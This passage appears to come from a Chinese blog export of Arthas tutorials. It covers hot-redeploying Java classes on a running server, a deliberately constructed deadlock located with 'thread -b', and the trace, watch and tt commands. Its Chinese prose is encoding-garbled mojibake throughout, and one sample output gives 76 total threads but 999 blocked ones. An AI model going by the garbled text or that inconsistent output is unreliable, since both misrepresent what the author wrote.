<h5 id="çƒ­éƒ¨ç½²å‘½ä»¤æ­¥éª¤"><a href="#çƒ­éƒ¨ç½²å‘½ä»¤æ­¥éª¤" class="headerlink" title="çƒ­éƒ¨ç½²å‘½ä»¤æ­¥éª¤"></a>çƒ­éƒ¨ç½²å‘½ä»¤æ­¥éª¤</h5><p>1ï¼Œåœ¨æœ¬åœ°ä¿®æ”¹å¥½javaç±»ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨jadå‘½ä»¤ç›´æ¥åœ¨æœåŠ¡å™¨ä¸Šåç¼–è¯‘ç”Ÿæˆjavaç±»åä¿®æ”¹ï¼Œå¦‚ä¸‹ï¼š</p>
<p>å‘½ä»¤ï¼šjad â€“source-only ç±»Referenceåœ°å€ &gt; åç¼–è¯‘æ–‡ä»¶ä¿å­˜çš„åœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --source-only com.test.service.impl.UserServiceImpl &gt; /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>
<p>2ï¼Œç¼–è¯‘javaç±»ï¼Œé‡æ–°ç”Ÿæˆclasså­—èŠ‚ç æ–‡ä»¶</p>
<p>å‘½ä»¤ï¼šmc -d /ç”Ÿæˆçš„classæ–‡ä»¶ä¿å­˜ç›®å½• éœ€è¦ç”Ÿæˆclassæ–‡ä»¶çš„javaåŸæ–‡ä»¶åœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mc -d /tmp/arthas /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>
<p>3ï¼Œæ‰¾åˆ°jvmé‡Œé¢çš„classLoaderHash</p>
<p>å‘½ä»¤ï¼šsc -d -f *ç±»å | grep classLoaderHash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sc -d *UserServiceImpl</span><br><span class="line">æˆ–</span><br><span class="line">sc -d *UserServiceImpl | grep classLoaderHash</span><br><span class="line">æˆ–</span><br><span class="line">sc -d -f *UserServiceImpl | grep classLoaderHash</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">classLoaderHash   18b4aac2 </span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šæ·»åŠ  -f å‚æ•°å¯ä»¥æŠŠç±»çš„å­—æ®µä¹Ÿè¾“å‡ºï¼Œå¦‚ï¼šâ€sc -d -f *ç±»åâ€ã€‚æ­¤å‘½ä»¤å»ºè®®ä¸æŒ‡å®šgrepï¼Œè¿™æ ·è¾“å‡ºçš„å‚æ•°æ›´å¤šï¼Œæ›´æœ‰åŠ©äºæˆ‘ä»¬åˆ¤æ–­åŠ è½½ç±»æ˜¯å¦å‡†ç¡®ã€‚</p>
<p>4ï¼Œè¿›è¡Œclassçƒ­éƒ¨ç½²</p>
<p>å‘½ä»¤ï¼šredefine -c ã€classLoaderHashã€‘ /ç¼–è¯‘åçš„classå®Œæ•´è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redefine -c ã€æ›¿æ¢ä¸ºclassLoaderHashã€‘ /tmp/arthas/UserServiceImpl.class</span><br></pre></td></tr></table></figure>

<p>5ï¼Œéƒ¨ç½²å®Œæˆï¼Œå¯ä»¥è®¿é—®æœ€æ–°å†…å®¹</p>
<p>6ï¼Œé€€å‡ºarthas<br>é€€å‡ºï¼Œå¹¶æœªå…³é—­arthasæœåŠ¡ï¼Œå¯ä»¥é‡æ–°è¿æ¥è¿›æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŒ‰é”®ï¼šq</span><br></pre></td></tr></table></figure>
<p>é€€å‡ºå¹¶å…³é—­arthasæœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stop æˆ– shutdown</span><br></pre></td></tr></table></figure>

<p>7ï¼Œé‡æ–°é“¾æ¥arthas</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 127.0.0.1 3658</span><br></pre></td></tr></table></figure>
<h5 id="shellå¿«é€Ÿç”Ÿæˆæ“ä½œè„šæœ¬"><a href="#shellå¿«é€Ÿç”Ÿæˆæ“ä½œè„šæœ¬" class="headerlink" title="shellå¿«é€Ÿç”Ÿæˆæ“ä½œè„šæœ¬"></a>shellå¿«é€Ÿç”Ÿæˆæ“ä½œè„šæœ¬</h5><p>è„šæœ¬åç§°ï¼šarthas.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#author: chenguolin</span></span><br><span class="line">p1=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;è¯·ä¼ å…¥ï¼šç±»Referenceï¼å¦‚ï¼šsh arthas.sh com.test.UserService&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------start--------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#####################ç”Ÿæˆçƒ­æ›´æ–°å‘½ä»¤##################&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;1ï¼ŒæŠŠclassåç¼–è¯‘ä¸ºjavaç±»ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;jad --source-only &#x27;</span><span class="variable">$p1</span><span class="string">&#x27; &gt; /tmp/arthas/&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27;.java&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;2ï¼Œä¿®æ”¹javaç±»ï¼Œå¹¶é‡æ–°ç¼–è¯‘ä¸ºclassï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span>  <span class="string">&#x27;mc -d /tmp/arthas /tmp/arthas/&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27;.java&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;3ï¼Œè·å–ç±»çš„classLoaderHashï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sc -d *&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27; | grep classLoaderHash&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;4ï¼Œå°†classçƒ­æ›´åˆ°jvmä¸­ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;redefine -c ã€æ›¿æ¢ä¸ºclassLoaderHashã€‘ /tmp/arthas/&#x27;</span><span class="variable">$&#123;p1##*.&#125;</span><span class="string">&#x27;.class&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------end----------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh arthas.sh com.test.service.impl.UserServiceImpl</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆè„šæœ¬ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------start--------------------------</span><br><span class="line"></span><br><span class="line">#####################ç”Ÿæˆçƒ­æ›´æ–°å‘½ä»¤##################</span><br><span class="line"></span><br><span class="line">1ï¼ŒæŠŠclassåç¼–è¯‘ä¸ºjavaç±»ï¼š</span><br><span class="line">jad --source-only com.test.service.impl.UserServiceImpl &gt; &#x2F;tmp&#x2F;arthas&#x2F;UserServiceImpl.java</span><br><span class="line"></span><br><span class="line">2ï¼Œä¿®æ”¹javaç±»ï¼Œå¹¶é‡æ–°ç¼–è¯‘ä¸ºclassï¼š</span><br><span class="line">mc -d &#x2F;tmp&#x2F;arthas &#x2F;tmp&#x2F;arthas&#x2F;UserServiceImpl.java</span><br><span class="line"></span><br><span class="line">3ï¼Œè·å–ç±»çš„classLoaderHashï¼š</span><br><span class="line">sc -d *UserServiceImpl | grep classLoaderHash</span><br><span class="line"></span><br><span class="line">4ï¼Œå°†classçƒ­æ›´åˆ°jvmä¸­ï¼š</span><br><span class="line">redefine -c ã€æ›¿æ¢ä¸ºclassLoaderHashã€‘ &#x2F;tmp&#x2F;arthas&#x2F;UserServiceImpl.class</span><br><span class="line"></span><br><span class="line">----------------------end----------------------------</span><br></pre></td></tr></table></figure>
<h4 id="æ–¹å¼äºŒï¼šarthas-ideaæ’ä»¶"><a href="#æ–¹å¼äºŒï¼šarthas-ideaæ’ä»¶" class="headerlink" title="æ–¹å¼äºŒï¼šarthas ideaæ’ä»¶"></a>æ–¹å¼äºŒï¼šarthas ideaæ’ä»¶</h4><h5 id="å®‰è£…ideaæ’ä»¶"><a href="#å®‰è£…ideaæ’ä»¶" class="headerlink" title="å®‰è£…ideaæ’ä»¶"></a>å®‰è£…ideaæ’ä»¶</h5><p>Idea Pluginsæ’ä»¶åç§°ï¼šarthas ideaï¼Œæ‰¾åˆ°å®‰è£…å³å¯ï¼Œé‡å¯å åœ¨ç±»æˆ–æ–¹æ³•ä¸Š å³é”®ï¼Œå³å¯çœ‹åˆ°ç›¸å…³çš„arthaså‘½ä»¤ã€‚</p>
<h5 id="ç”Ÿæˆçƒ­éƒ¨ç½²è„šæœ¬"><a href="#ç”Ÿæˆçƒ­éƒ¨ç½²è„šæœ¬" class="headerlink" title="ç”Ÿæˆçƒ­éƒ¨ç½²è„šæœ¬"></a>ç”Ÿæˆçƒ­éƒ¨ç½²è„šæœ¬</h5><p>1ï¼Œä»£ç ä¿®æ”¹å®Œæˆåï¼Œå…ˆæ‰§è¡Œbuild recompileå‘½ä»¤ è¿›è¡Œå¼ºåˆ¶æ€§ç¼–è¯‘</p>
<image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/arthas-recompile.png" width=350>


<p>2ï¼Œç„¶åï¼Œåœ¨ç±»åä¸Šï¼Œç‚¹å‡»é¼ æ ‡å³é”®ï¼Œé€‰æ‹©ï¼šArthas Command &gt;&gt; (hot swap)redefineï¼Œç”Ÿæˆçƒ­éƒ¨ç½²è„šæœ¬</p>
<image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/arthas-hot-swap.png" width=550>


<p>3ï¼Œå°†æ‹·è´åˆ°ç²˜è´´æ¿çš„å†…å®¹ä¿å­˜åˆ°â€œ.shâ€å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</p>
<p>å½“ç„¶äº†ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œæ­¤å‘½ä»¤ï¼Œä¸è¿‡å‘½ä»¤å¤ªé•¿äº†ï¼Œä¸æ¨èåœ¨å‘½ä»¤è¡Œè¿™ä¹ˆæ“ä½œï¼Œå¦‚æœä½ éè¦é—®ä¸ºä»€ä¹ˆï¼Ÿé‚£ä½ è¯•è¯•å°±çŸ¥é“äº†ï¼</p>
<h5 id="æ‰§è¡Œè„šæœ¬å®Œæˆçƒ­éƒ¨ç½²"><a href="#æ‰§è¡Œè„šæœ¬å®Œæˆçƒ­éƒ¨ç½²" class="headerlink" title="æ‰§è¡Œè„šæœ¬å®Œæˆçƒ­éƒ¨ç½²"></a>æ‰§è¡Œè„šæœ¬å®Œæˆçƒ­éƒ¨ç½²</h5><p>å°†.shè„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨åï¼Œç›´æ¥ç”¨shå‘½ä»¤è¿è¡Œï¼Œå³å¯å®Œæˆä»£ç çƒ­éƒ¨ç½²ï¼</p>
<p>æ³¨æ„ï¼šæ‰§è¡Œå‘½ä»¤çš„æœåŠ¡å™¨ä¸Šå¿…é¡»è¦æœ‰jdkç¯å¢ƒ</p>
]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>çƒ­éƒ¨ç½²</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-threadå‘½ä»¤å®šä½çº¿ç¨‹æ­»é”</title>
    <url>/2020/06/19/arthas-thread-blocked/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;æœ‰æ—¶å€™æˆ‘ä»¬å‘ç°åº”ç”¨å¡ä½äº†ï¼Œé€šå¸¸æ˜¯ç”±äºæŸä¸ªçº¿ç¨‹æ‹¿ä½äº†æŸä¸ªé”ï¼Œ å¹¶ä¸”å…¶ä»–çº¿ç¨‹éƒ½åœ¨ç­‰å¾…è¿™æŠŠé”é€ æˆçš„ã€‚ ä¸ºäº†æ’æŸ¥è¿™ç±»é—®é¢˜ï¼Œarthasæä¾›äº†threadå‘½ä»¤ï¼ŒååŠ©æˆ‘ä»¬å¿«é€Ÿå®šä½ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;ä¸‹é¢æˆ‘ä»¬ç”¨ä¸ªæ¡ˆä¾‹å»æ¼”ç¤ºä¸€ä¸‹è¿™ä¸ªæ­»é”åœºæ™¯ï¼Œç„¶åç”¨arthaså»å®šä½å‡ºè¿™ä¸ªé—®é¢˜ã€‚</p>
<h4 id="æ¨¡æ‹Ÿæ­»é”çš„åœºæ™¯"><a href="#æ¨¡æ‹Ÿæ­»é”çš„åœºæ™¯" class="headerlink" title="æ¨¡æ‹Ÿæ­»é”çš„åœºæ™¯"></a>æ¨¡æ‹Ÿæ­»é”çš„åœºæ™¯</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object obj1 = <span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">private</span> Object obj2 = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Response <span class="title">hb</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj1) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (obj2) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[dead]æ‰§è¡Œå†…å®¹111...&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj2) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (obj1) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[dead]æ‰§è¡Œå†…å®¹222...&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> Response.success();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="é€šè¿‡threadå‘½ä»¤å®šä½"><a href="#é€šè¿‡threadå‘½ä»¤å®šä½" class="headerlink" title="é€šè¿‡threadå‘½ä»¤å®šä½"></a>é€šè¿‡threadå‘½ä»¤å®šä½</h4><p>1ï¼Œç›´æ¥ä½¿ç”¨â€threadâ€œå‘½ä»¤ï¼Œè¾“å‡ºçº¿ç¨‹ç»Ÿè®¡ä¿¡æ¯ã€‚å…¶ä¸­ï¼šBLOCKED è¡¨ç¤ºç›®å‰é˜»å¡çš„çº¿ç¨‹æ•°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤æ•ˆæœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Threads Total: 76, NEW: 0, RUNNABLE: 19, BLOCKED: 999, WAITING: 18, TIMED_WAITING: 15, TERMINATED: 0,</span><br><span class="line"> Internal threads: 10                                                                               </span><br><span class="line">ID  NAME                     GROUP        PRIORIT STATE   %CPU     DELTA_T TIME    INTERRUP DAEMON  </span><br><span class="line">88  sentinel-time-tick-threa main         5       TIMED_W 3.14     0.006   0:3.618 false    true    </span><br><span class="line">118 arthas-command-execute   system       5       RUNNABL 1.43     0.002   0:0.014 false    true    </span><br><span class="line">-1  C1 CompilerThread2       -            -1      -       0.16     0.000   0:3.077 false    true    </span><br><span class="line">-1  VM Periodic Task Thread  -            -1      -       0.06     0.000   0:0.078 false    true    </span><br><span class="line">2   Reference Handler        system       10      WAITING 0.0      0.000   0:0.017 false    true    </span><br><span class="line">3   Finalizer                system       8       WAITING 0.0      0.000   0:0.011 false    true </span><br></pre></td></tr></table></figure>

<p>2ï¼Œæ‰§è¡Œâ€œthread -bâ€å‘½ä»¤ï¼Œæ‰¾å‡ºå½“å‰é˜»å¡å…¶ä»–çº¿ç¨‹çš„çº¿ç¨‹ï¼Œå³é€ æˆæ­»é”çš„ç½ªé­ç¥¸é¦–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread -b</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤æ•ˆæœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Thread-39&quot; Id&#x3D;93 BLOCKED on java.lang.Object@1820d666 owned by &quot;Thread-38&quot; Id&#x3D;92</span><br><span class="line">    at cn.soilove.expro.controller.TestController.lambda$hb$1(TestController.java:43)</span><br><span class="line">    -  blocked on java.lang.Object@1820d666</span><br><span class="line">    -  locked java.lang.Object@29064ce5 &lt;---- but blocks 7 other threads!</span><br><span class="line">    at cn.soilove.expro.controller.TestController$$Lambda$1407&#x2F;395258860.run(Unknown Source)</span><br><span class="line">    at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šä¸Šé¢è¿™ä¸ªå‘½ä»¤ç›´æ¥è¾“å‡ºäº† é€ æˆæ­»é”çš„çº¿ç¨‹IDï¼Œå’Œå…·ä½“çš„ä»£ç ä½ç½®ï¼Œä»¥åŠå½“å‰çº¿ç¨‹ä¸€å…±é˜»å¡çš„çº¿ç¨‹æ•°é‡ï¼šâ€œ&lt;â€”- but blocks 7 other threads!â€œã€‚æ˜¯ä¸æ˜¯å¾ˆä¼˜ç§€ï¼Ÿç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦å»ä¿®æ”¹æ‰è¿™çš„ä»£ç é—®é¢˜å³å¯ã€‚</p>
<p>3ï¼Œå…¶ä»–çº¿ç¨‹å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thread â€“all, æ˜¾ç¤ºæ‰€æœ‰çš„çº¿ç¨‹ï¼›</span><br><span class="line">thread id, æ˜¾ç¤ºæŒ‡å®šçº¿ç¨‹çš„è¿è¡Œå †æ ˆï¼›</span><br><span class="line">thread â€“stateï¼šæŸ¥çœ‹æŒ‡å®šçŠ¶æ€çš„çº¿ç¨‹ï¼Œå¦‚ï¼šthread â€“state BLOCKEDï¼›</span><br><span class="line">thread -n 3ï¼šå±•ç¤ºå½“å‰æœ€å¿™çš„å‰Nä¸ªçº¿ç¨‹å¹¶æ‰“å°å †æ ˆï¼›</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>thread</tag>
        <tag>æ­»é”</tag>
        <tag>çº¿ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-traceå‘½ä»¤å’Œthreadå‘½ä»¤çš„å¦™ç”¨</title>
    <url>/2020/06/17/arthas-trace-thread/</url>
    <content><![CDATA[<h4 id="traceå‘½ä»¤ä½¿ç”¨"><a href="#traceå‘½ä»¤ä½¿ç”¨" class="headerlink" title="traceå‘½ä»¤ä½¿ç”¨"></a>traceå‘½ä»¤ä½¿ç”¨</h4><p>trace èƒ½æ–¹ä¾¿çš„å¸®åŠ©ä½ å®šä½å’Œå‘ç°å›  RT é«˜è€Œå¯¼è‡´çš„æ€§èƒ½é—®é¢˜ç¼ºé™·ï¼Œä½†æ¯æ¬¡åªèƒ½è·Ÿè¸ªä¸€çº§æ–¹æ³•çš„è°ƒç”¨é“¾è·¯<br>æ³¨ï¼šä»¥ä¸‹å‘½ä»¤æŒ‰â€qâ€é€€å‡º</p>
<p>1,ç›‘æ§æ–¹æ³•çš„è¯·æ±‚é“¾è·¯ä»¥åŠè€—æ—¶ï¼Œæ¬¡æ•°=3ï¼Œè€—æ—¶&gt;1æ¯«ç§’ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trace cn.soilove.expro.webadmin.AdminLoginController login -n 3 <span class="string">&quot;#cost&gt;1&quot;</span></span><br></pre></td></tr></table></figure>
<p>2,å°†jdkå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¹Ÿæ”¶é›†å‡ºæ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trace --skipJDKMethod <span class="literal">false</span> cn.soilove.expro.webadmin.AdminLoginController login -n 3 <span class="string">&quot;#cost&gt;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>è·Ÿè¸ªæ•ˆæœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Affect(class count: 1 , method count: 1) cost in 344 ms, listenerId: 1</span><br><span class="line">&#96;---ts&#x3D;2020-06-17 13:57:24;thread_name&#x3D;http-nio-8080-exec-2;id&#x3D;1c;is_daemon&#x3D;true;priority&#x3D;5;TCCL&#x3D;org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader@fe9da7</span><br><span class="line">    &#96;---[109.157235ms] cn.soilove.expro.webadmin.AdminLoginController:login()</span><br><span class="line">        +---[0.048382ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserName() #39</span><br><span class="line">        +---[0.025775ms] org.apache.commons.lang3.StringUtils:isEmpty() #39</span><br><span class="line">        +---[0.024296ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserPwd() #40</span><br><span class="line">        +---[0.015797ms] org.apache.commons.lang3.StringUtils:isEmpty() #40</span><br><span class="line">        +---[0.013396ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserName() #44</span><br><span class="line">        +---[0.014851ms] cn.soilove.expro.webadmin.vo.login.AdminLoginParam:getUserPwd() #44</span><br><span class="line">        +---[108.179494ms] cn.soilove.expro.service.user.AdminUserService:login() #44</span><br><span class="line">        &#96;---[0.046167ms] cn.soilove.expro.common.Response:success() #46</span><br></pre></td></tr></table></figure>

<h4 id="threadå‘½ä»¤ä½¿ç”¨"><a href="#threadå‘½ä»¤ä½¿ç”¨" class="headerlink" title="threadå‘½ä»¤ä½¿ç”¨"></a>threadå‘½ä»¤ä½¿ç”¨</h4><p>threadæ˜¯çº¿ç¨‹æ’æŸ¥å‘½ä»¤</p>
<p>1ï¼Œä¸€é”®å±•ç¤ºå½“å‰æœ€å¿™çš„å‰Nä¸ªçº¿ç¨‹å¹¶æ‰“å°å †æ ˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread -n 3</span><br></pre></td></tr></table></figure>

<p>2ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬å‘ç°åº”ç”¨å¡ä½äº†ï¼Œé€šå¸¸æ˜¯ç”±äºæŸä¸ªçº¿ç¨‹æ‹¿ä½äº†æŸä¸ªé”ï¼Œ å¹¶ä¸”å…¶ä»–çº¿ç¨‹éƒ½åœ¨ç­‰å¾…è¿™æŠŠé”é€ æˆçš„ã€‚<br>ä¸ºäº†æ’æŸ¥è¿™ç±»é—®é¢˜ï¼Œarthasæä¾›äº†ä¸€é”®æ‰¾å‡ºé‚£ä¸ªç½ªé­ç¥¸é¦–çš„å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thread -b</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>thread</tag>
        <tag>çº¿ç¨‹</tag>
        <tag>trace</tag>
        <tag>é“¾è·¯è·Ÿè¸ª</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-ä½¿ç”¨watchå’Œttè§‚æµ‹æ–¹æ³•æ‰§è¡Œæ•°æ®</title>
    <url>/2020/06/17/arthas-watch-tt/</url>
    <content><![CDATA[<h4 id="watchå‘½ä»¤ä½¿ç”¨"><a href="#watchå‘½ä»¤ä½¿ç”¨" class="headerlink" title="watchå‘½ä»¤ä½¿ç”¨"></a>watchå‘½ä»¤ä½¿ç”¨</h4><p>1ï¼Œä½¿ç”¨watchå‘½ä»¤è®©ä½ æ–¹ä¾¿çš„è§‚å¯Ÿåˆ°æŒ‡å®šæ–¹æ³•çš„è°ƒç”¨æƒ…å†µï¼Œèƒ½è§‚å¯Ÿ<br>åˆ°çš„èŒƒå›´ä¸ºï¼šè¿”å›å€¼ã€æŠ›å‡ºå¼‚å¸¸ã€å…¥å‚ï¼Œé€šè¿‡ç¼–å†™ OGNL è¡¨è¾¾å¼è¿›è¡Œå¯¹åº”å˜é‡çš„æŸ¥çœ‹</p>
<p>å‘½ä»¤ï¼šwatch  ç±»reference æ–¹æ³•åç§° â€œ{params,returnObj,throwExp}â€ -x éå†æ·±åº¦ -n æ”¶é›†æ¬¡æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 3</span><br></pre></td></tr></table></figure>
<p>2ï¼ŒæŠŠè§‚æµ‹æ•°æ®è®°å½•åˆ°æ–‡ä»¶ä¸­</p>
<p>å‘½ä»¤ï¼šç›‘æµ‹å‘½ä»¤ &gt; æ—¥å¿—è·¯å¾„ &amp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 10 &gt; /tmp/arthas/watch.log &amp;</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå¢åŠ è€—æ—¶æ¡ä»¶ï¼Œcost&gt;200(å•ä½æ˜¯ms)è¡¨ç¤ºåªæœ‰å½“è€—æ—¶å¤§äº200msæ—¶æ‰ä¼šè¾“å‡º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 3 <span class="string">&quot;#cost&gt;200&quot;</span></span><br></pre></td></tr></table></figure>
<p>4ï¼Œå‘ç”Ÿå¼‚å¸¸æ‰è§‚æµ‹ï¼Œä½¿ç”¨-eè¡¨ç¤ºæŠ›å‡ºå¼‚å¸¸æ—¶æ‰è§¦å‘æ”¶é›†ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query <span class="string">&quot;&#123;params,returnObj,throwExp&#125;&quot;</span> -x 3 -n 3 -e</span><br></pre></td></tr></table></figure>
<p>5ï¼Œå¦‚æœæƒ³æŸ¥çœ‹æ–¹æ³•è¿è¡Œå‰åï¼Œå½“å‰å¯¹è±¡ä¸­çš„å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨targetå…³é”®å­—ï¼Œä»£è¡¨å½“å‰å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨target.field_nameè®¿é—®å½“å‰å¯¹è±¡çš„æŸä¸ªå±æ€§</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch com.test.UserService query -n 3 <span class="string">&quot;target&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="ttå‘½ä»¤ä½¿ç”¨"><a href="#ttå‘½ä»¤ä½¿ç”¨" class="headerlink" title="ttå‘½ä»¤ä½¿ç”¨"></a>ttå‘½ä»¤ä½¿ç”¨</h4><p>1,ä½¿ç”¨ttå‘½ä»¤è®°å½•ä¸‹æ–¹æ³•çš„æ¯æ¬¡è°ƒç”¨ç¯å¢ƒç°åœºï¼Œæ¬¡æ•°=20ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -t -n 20 com.test.UserService query</span><br></pre></td></tr></table></figure>
